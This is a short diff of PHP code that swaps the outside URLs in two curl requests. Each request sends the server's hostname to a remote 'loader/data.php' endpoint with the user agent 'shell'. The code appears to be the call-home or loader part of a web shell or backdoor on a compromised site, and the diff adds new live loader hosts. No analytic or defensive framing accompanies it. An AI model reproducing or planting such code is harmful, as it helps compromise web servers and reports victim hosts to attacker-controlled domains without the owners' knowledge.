@@ -5,7 +5,7 @@ if($sayi < 50)
   $curl = curl_init();
  curl_setopt_array($curl, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://whm.eshopdemo1.princeit.us//load/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://www.multipackplastic.com/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'shell'
 ]);
  $resp = curl_exec($curl);
@@ -18,7 +18,7 @@ else {
   $curl2 = curl_init();
  curl_setopt_array($curl2, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://www.multipackplastic.com/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://petrowin.sg/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'shell'
 ]);
  $resp2 = curl_exec($curl2);
